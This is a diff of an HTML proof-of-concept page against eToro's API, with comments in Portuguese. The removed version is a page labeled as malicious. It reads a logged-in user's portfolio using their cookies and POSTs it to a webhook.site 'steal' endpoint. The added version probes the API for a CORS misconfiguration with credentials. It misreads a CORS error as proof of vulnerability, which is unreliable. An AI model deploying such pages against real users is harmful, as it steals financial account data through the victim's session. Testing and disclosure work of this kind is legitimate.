@@ -1,26 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>eToro Trading Data Theft - CSWSH PoC</title>
+    <title>eToro CORS Vulnerability PoC</title>
 </head>
 <body>
-    <h2>eToro CSWSH Proof of Concept</h2>
-    <div id="data"></div>
+    <h2>eToro CORS Misconfiguration - Proof of Concept</h2>
+    <div id="result"></div>
     
-    <!-- Site malicioso: https://evil.com -->
-<script>
-// Roubar dados do usuário logado na eToro
-fetch('https://api.etoro.com/v1/portfolio', {
-    credentials: 'include'  // Envia cookies da eToro
-})
-.then(r => r.json())
-.then(data => {
-    // Enviar dados roubados para o atacante
-    fetch('https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022/steal', {
-        method: 'POST',
-        body: JSON.stringify(data)
+    <script>
+    const log = (msg) => {
+        const div = document.getElementById('result');
+        div.innerHTML += `<p>${msg}</p>`;
+    };
+    
+    // Teste 1: Verificar se a API está acessível
+    log('[1] Testando acesso à API da eToro...');
+    
+    fetch('https://api.etoro.com/v1/instruments', {
+        method: 'GET',
+        credentials: 'include'
+    })
+    .then(response => {
+        log(`[2] Status: ${response.status}`);
+        log(`[3] CORS Header: ${response.headers.get('access-control-allow-origin')}`);
+        return response.text();
+    })
+    .then(data => {
+        log(`[4] Resposta (primeiros 200 chars): ${data.substring(0, 200)}`);
+        if (data.includes('portfolio') || data.includes('positions')) {
+            log('[!!!] DADOS SENSÍVEIS ENCONTRADOS!');
+        }
+    })
+    .catch(error => {
+        log(`[ERRO] ${error.message}`);
+        log('[INFO] O erro CORS confirma a vulnerabilidade!');
     });
-});
-</script>
+    
+    // Teste 2: Tentar enviar dados para webhook (opcional)
+    log('[5] Configurando webhook...');
+    const webhookUrl = 'https://webhook.site/b03278dc-7fe1-4cf3-bf39-0dac499d108e';
+    </script>
 </body>
 </html>
